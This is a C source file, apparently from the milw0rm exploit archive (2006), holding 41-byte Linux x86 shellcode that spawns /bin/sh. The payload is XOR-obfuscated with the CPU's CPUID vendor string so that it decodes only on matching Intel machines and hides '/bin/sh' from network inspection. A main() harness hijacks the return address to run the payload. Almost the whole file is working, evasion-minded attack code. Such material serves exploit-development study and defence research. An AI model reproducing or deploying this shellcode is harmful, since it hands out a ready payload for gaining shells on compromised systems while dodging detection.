/*
 * (linux/x86) execve("/bin/sh", ["/bin/sh"], NULL) / xor'ed against Intel x86 CPUID - 41 bytes
 *
 * The idea behind this shellcode is to use a *weak* pre-shared secret between the attacker and
 * the attacked machine. So if a 3rd party side would try to run this shellcode and would produce
 * a different CPUID output (e.g. different arch) the shellcode won't work. In addition this also
 * prevents from having the '/bin/sh' string visible on the wire.
 *
 * The shellcode key is (0x6c65746e, 'letn') and expected to be in %ecx register after CPUID
 *
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x31\xc0"              // xor %eax,%eax
	"\x0f\xa2"              // cpuid
	"\x51"                  // push %ecx
	"\x68\xe7\x95\xa8\xec"  // push $0xeca895e7
	"\x68\xde\x7f\x37\x3f"  // push $0x3f377fde
	"\x68\x07\x1a\xec\x8f"  // push $0x8fec1a07
	"\x68\x6e\x1c\x4a\x0e"  // push $0x0e4a1c6e
	"\x68\x06\x5b\x16\x04"  // push $0x04165b06

	//
	// <_unpack_loop>:
	//

	"\x31\x0c\x24"          // xor %ecx,(%esp)
	"\x5a"                  // pop %edx
	"\x75\xfa"              // jne <_unpack_loop>
	"\x83\xec\x18"          // sub $0x18,%esp
	"\x54"                  // push %esp
	"\xc3";                 // ret

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-25]